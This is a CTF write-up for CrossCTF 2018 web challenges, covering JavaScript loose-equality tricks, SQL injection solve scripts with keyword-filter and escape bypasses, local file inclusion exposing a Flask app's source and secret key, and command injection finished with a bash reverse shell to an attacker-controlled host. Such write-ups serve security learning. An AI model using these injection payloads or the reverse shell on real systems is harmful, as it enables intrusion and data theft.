# Crossctf 2018 Qualifier Writeups 

Credits to my teammates: https://github.com/tankeehock and https://github.com/tohzijie

## Web
QruirkyScript 1 - 5 were do-able by referncing the truthy table from: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Equality_comparisons_and_sameness

### QuirkyScript 1
```
var flag = require("./flag.js");
var express = require('express')
var app = express()

app.get('/flag', function (req, res) {
    if (req.query.first) {
        if (req.query.first.length == 8 && req.query.first == ",,,,,,," ) {
            res.send(flag.flag);
            return;
        }
    }
    res.send("Try to solve this.");
});

app.listen(31337)
```

The following condition must be met: Length = 8 and variable must be ',,,,,,,'. To achieve this, an empty array of size 8 will match the length 8, and the empty commas in the array will be treated as a string of commas when the following is passed in: [,,,,,,,]

Therefore, to achieve this, the following get request will fulfill the conditions: ```http://target/flag?first=&first=&first=&first=&first=&first=&first=&first=&first=```

CrossCTF{C0mm4s_4ll_th3_w4y_t0_th3_fl4g}



### QuirkyScript 2
```
var flag = require("./flag.js");
var express = require('express')
var app = express()
app.get('/flag', function(req, res) {
    if (req.query.second) {
        if (req.query.second != "1" && req.query.second.length == 10 && req.query.second == true) {
            res.send(flag.flag);
            return;
        }
    }
    res.send("Try to solve this.");
});
app.listen(31337)
```

The following condition must be met: Length = 10 and variable must be TRUE. To achieve this, we need to abuse the weak comparator. In javascript, 1 = true, and 0000000001 == true. (Got this from multiple testing of how values are compared. Read the above link for more information on how == comapres values)

Therefore, to achieve this, the following get request will fulfill the conditions: ```http://target/flag?second?=0000000001```

CrossCTF{M4ny_w4ys_t0_mak3_4_numb3r}



### QuirkyScript 3 (to be updated)
```
var flag = require("./flag.js");
var express = require('express')
var app = express()
app.get('/flag', function(req, res) {
    if (req.query.third) {
        if (Array.isArray(req.query.third)) {
            third = req.query.third;
            third_sorted = req.query.third.sort();
            if (Number.parseInt(third[0]) > Number.parseInt(third[1]) && third_sorted[0] == third[0] && third_sorted[1] == third[1]) {
                res.send(flag.flag);
                return;
            }
        }
    }
    res.send("Try to solve this.");
});
app.listen(31337)
```
The following condition must be met after the array is sorted. The first element in the array (after converting into an Integer) must be larger than the second element (after converstion) and the indexes of the element in the original array before and after sorting must be the same. We understand that the browser will take in our GET request as a string and the sorting will be done based on the first character of the string.

To achieve the conditions, we look into the ascii table to find the hexadecimal representation of each number and chose a relatively large number which has hexadecimal starting with 0. We chose 0xA (Decimal 10). ```http://target/flag?third?=0xA&third=1```

CrossCTF{th4t_r0ck3t_1s_hug3}



### QuirkyScript 4
```
var flag = require("./flag.js");
var express = require('express')
var app = express()
app.get('/flag', function(req, res) {
    if (req.query.fourth) {
        if (req.query.fourth == 1 && req.query.fourth.indexOf("1") == -1) {
            res.send(flag.flag);
            return;
        }
    }
    res.send("Try to solve this.");
});
app.listen(31337)
```

The following condition must be met: variable = 1 and "1" is not the variable. WUT?!
To achieve this, we need to abuse the weak comparator. In javascript, [0x01] == 1 (WOW), and suprisingly, if a=[0x01], a.indexOf("1") = -1. SO CONDITION IS MET! Additionally, I remembered from one of my web class that we can past in an array for GET request using the [].

Therefore, to achieve this, the following get request will fulfill the conditions: ```http://ctf.pwn.sg:8084/flag?fourth[]=0x01```

CrossCTF{1m_g0ing_hungry}



### QuirkyScript 5
```
var flag = require("./flag.js");
var express = require('express')
var app = express()
app.get('/flag', function(req, res) {
    var re = new RegExp('^I_AM_ELEET_HAX0R$', 'g');
    if (re.test(req.query.fifth)) {
        if (req.query.fifth === req.query.six && !re.test(req.query.six)) {
            res.send(flag.flag);
        }
    }
    res.send("Try to solve this.");
});
app.listen(31337)
```

For this, me and my teammates were not able to explain why our GET request worked. But it seems like passing ```I_AM_ELEET_HAX0R``` to variables firth and six fulfills the if condition.

Therefore, to achieve this, the following get request will fulfill the conditions: ```http://ctf.pwn.sg:8085/flag?fifth=I_AM_ELEET_HAX0R&six=I_AM_ELEET_HAX0R```

CrossCTF{1_am_n1k0las_ray_zhizihizhao}


### Babyweb

This was a SQL injection challenge. The script disallowed certain keywords, but this can be overcome by using the ``/*!KEYWORD*/`` method. Example ``(/*!UNION*/)``

```
import requests
import binascii


payload = "'/* *//*!UNION*//* *//*!SELECT*//* */flag/* */FROM/* */users;##"
r = requests.post("http://ctf.pwn.sg:8180/index.php?search", data={'username':  payload})
z = r.text.replace('<tr>',' ')
z = z.replace('<td>',' ')
z = z.replace('</tr>',' ')
z = z.replace('</td>',' ')
z = z.replace('</tbody>',' ')
x = z.find('CrossCTF')
y = z.find('}')
print z[x:y+1]
```
CrossCTF{SiMpLe_sQl_iNjEcTiOn_aS_WaRmUp}



# Crossctf 2018 Finals Writeups (WIP)

## Web

### GoCoin! (Lack of input validation)
Challenge allows you to deposit or withdraw coins. Subsequently 'buy' the flag.

Putting a ``-1000000000000000`` in the parameter will allow to 'deposit' a huge amount, resulting to the purchase of the flag.
CrossCTF{G0C0in_Is_Th3_Nex7_Bi5_Th@ng!} 



### GoCoin! Plus Plus 

To be updated


### RetroWeb
The web filters the following, 

```
if (preg_match('/\s/', $username) or preg_match('/[\/\\\\]/', $username) or preg_match('/(and|or|null|not|union|select|from|where|group|order|having|limit|into|file|case|like)/i', $username) or preg_match('/(--|\/\*|=|>|<)/', $username)) 
        exit('die hax0r!');
$username = mysql_escape_string($username);
```

``mysql_rescape_string()`` can be overcome through the use of encoded characters.

The following is he solve script:
```
import requests
import binascii
import os

flag = ''
counter = 1
while True:
        for i in range (33,127):
                char = str(hex(i))
                a = os.popen('curl --data username="%bf%27||BINARY(MID(flag,'+str(counter)+',1))IN('+char+');##" --silent -X POST http://ftc1.pwn.sg:8180/index.php?search').read()
                if "Exists" in a:
                        flag += chr(i)
                        counter += 1
                        os.system('clear')
                        print flag

```
CrossCTF{Why_W0uLd_Any0ne_<3_Web?!}



### The Terminal 
There is LFI on the app which allows the disclosure of files.
``http://ctf.pwn.sg:4082/file?filename=[file_name]``

Doing the following reveals great information about what the machones has.
``http://ctf.pwn.sg:4082/file?filename=/proc/self/environ``

```
 "HOSTNAME=ca27413396a7 TERM=xterm PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin HOME=/root MAIL=/var/mail/theterminal LOGNAME=theterminal USER=theterminal USERNAME=theterminal SHELL=/bin/sh SUDO_COMMAND=/usr/bin/gunicorn -w 8 -b 0.0.0.0:8082 app:app SUDO_USER=root SUDO_UID=0 SUDO_GID=0 "
```

So apparently it runes gunicorn! Out of instinct, I included app.py in the LFI parameter, and I was given the code!

```
"#!/usr/bin/python

from flask import Flask, redirect, request, make_response, session
from flask_cors import CORS
import json
import os
from PIL import Image, ImageDraw, ImageFont
import StringIO
import subprocess
import sqlite3

app = Flask(__name__)
app.secret_key = '3R-\\x95\\x06s\\xc0G\\x11+\\x03\\x96\\xa5(\\x15\\xfc\\x96Un\\xdc\\xe8\\x05\\xa11'
# Enable cross origin sharing for all endpoints
CORS(app, supports_credentials=True)

# Remember to update this list
ENDPOINT_LIST = ['/', '/meta/heartbeat', '/escape', '/picturise', '/login',
                 '/whoami', '/logout', '/posts', '/posts/new', '/file'
                ]
                
                def make_json_response(data, status=True, code=200):
    \"\"\"Utility function to create the JSON responses.\"\"\"
    
    to_serialize = {}
    if status:
        to_serialize['status'] = True
        if data is not None:
            to_serialize['result'] = data
    else:
        to_serialize['status'] = False
        to_serialize['error'] = data
    response = app.response_class(
        response=json.dumps(to_serialize),
        status=code,
        mimetype='application/json'
    )
    return response
    
    
    @app.route(\"/\")
def index():
    \"\"\"Returns a list of implemented endpoints.\"\"\"
    return make_json_response(ENDPOINT_LIST)
    
    @app.route(\"/meta/heartbeat\")
def meta_heartbeat():
    \"\"\"Returns true\"\"\"
    return make_json_response(None)
    
    @app.route(\"/escape\")
def escape():
    \"\"\"Redirects the user to the escape url\"\"\"
    if request.args.get('target'):
        return redirect(request.args.get('target'))
    else:
        return make_json(response([], False))
        
        @app.route(\"/picturise/<what>\")
def pictureise(what):
    \"\"\"Calls a system command and picturises it.\"\"\"
    georgia_bold = 'fonts/georgia_bold.ttf'
    georgia_bold_italic = 'fonts/georgia_bold_italic.ttf'
    W, H = (400, 100) # image size
    txt = subprocess.check_output(what, shell=True).strip() # text to render
    background = (0,164,201) # white
    fontsize = 14
    font = ImageFont.truetype(georgia_bold_italic, fontsize)
    image = Image.new('RGBA', (W, H), background)
    draw = ImageDraw.Draw(image)
    w, h = font.getsize(txt)
    draw.text(((W-w)/2,(H-h)/2), txt, fill='white', font=font)
    output = StringIO.StringIO()
    image.save(output, format=\"PNG\")
    contents = output.getvalue()
    output.close()
    response = make_response(contents)
    response.headers.set('Content-Type', 'image/png')
    return response
    
    @app.route(\"/login/<username>/<password>\")
def login(username, password):
    db = sqlite3.connect(\"database.db\")
    results = db.execute(\"select username, password from accounts;\").fetchall()
    for i in results:
        if i[0] == username and i[1] == password:
            session['user'] = username
            return make_json_response({\"message\": \"Thanks for logging in %s\" %
                username})
    return make_json_response({\"message\": \"Bad credentials\"}, False)
    
    @app.route(\"/whoami\")
def whoami():
    if 'user' in session:
        return make_json_response({\"message\": \"You are %s\" % session['user']})
    else:
        return make_json_response({\"message\": \"You are not logged in\"}, False)
        
        @app.route(\"/logout\")
def logout():
    if 'user' in session:
        session.pop(\"user\", None)
        return make_json_response({\"message\": \"You are logged out\"})
    else:
        return make_json_response({\"message\": \"You are not logged in\"}, False)
        
        @app.route(\"/posts\")
def posts():
    if 'user' in session:
        db = sqlite3.connect(\"database.db\")
        results = db.execute(\"select title, author, body from posts;\").fetchall()
        db.close()
        returned = \"<p>\"
        for i in results:
            returned += \"<strong>%s</strong>&nbsp<em>by %s</em>: %s<br />\" % i
        returned += \"</p>\"
        return make_json_response({\"message\": returned})
    else:
        return make_json_response({\"message\": \"You are not logged in\"}, False)
        
        @app.route(\"/posts/new\", methods=[\"POST\"])
def posts_new():
    if 'user' in session:
        if not request.form.get(\"title\") or not request.form.get(\"body\"):
            return make_json_response({\"message\": \"Supply a title and body\"}, False)
        db = sqlite3.connect(\"database.db\")
        db.execute(\"insert into posts values ('%s', '%s', '%s');\" % (
            request.form.get(\"title\"), session['user'],
            request.form.get(\"body\")))
        db.commit()
        db.close()
        return make_json_response({\"message\": \"Posted!\"})
    else:
        return make_json_response({\"message\": \"You are not logged in\"}, False)
        
        @app.route(\"/file\")
def getfile():
    if not request.args.get(\"filename\"):
        return make_json_response({\"message\": \"Need a filename\"}, False)
    filecontents = file(request.args.get(\"filename\")).read()
    return make_json_response({\"message\": filecontents})
    
    if __name__ == '__main__':
    # Change the working directory to the script directory
    abspath = os.path.abspath(__file__)
    dname = os.path.dirname(abspath)
    os.chdir(dname)
    
    # Run the application
    app.run(debug=False, port=8082, host=\"0.0.0.0\")
    
```

Examining ``picturise`` API route, it appears that it takes in a paremeter and executes a command!

```
@app.route(\"/picturise/<what>\")
def pictureise(what):
    \"\"\"Calls a system command and picturises it.\"\"\"
    georgia_bold = 'fonts/georgia_bold.ttf'
    georgia_bold_italic = 'fonts/georgia_bold_italic.ttf'
    W, H = (400, 100) # image size
    txt = subprocess.check_output(what, shell=True).strip() # text to render
    background = (0,164,201) # white
    fontsize = 14
    font = ImageFont.truetype(georgia_bold_italic, fontsize)
    image = Image.new('RGBA', (W, H), background)
    draw = ImageDraw.Draw(image)
    w, h = font.getsize(txt)
    draw.text(((W-w)/2,(H-h)/2), txt, fill='white', font=font)
    output = StringIO.StringIO()
    image.save(output, format=\"PNG\")
    contents = output.getvalue()
    output.close()
    response = make_response(contents)
    response.headers.set('Content-Type', 'image/png')
    return response
```

To finish this, I spun up a VM in the cloud to do a reverse shell.

Bash reverse shell: ``bash -i >& /dev/tcp/[ip]/[port] 0>&1``
Bash reverse shell Base64 encode: ``Snipped out for simplicity``
Payload: ``echo [Base64 reverse shell] | base64 -d | bash``

Once reverse shell is gained, DO THE SHELL DANCE!!

CrossCTF{C4ther1ne_zet4_j0n3s_w4s_1n_l0st_1n_tr4nsl4t1on}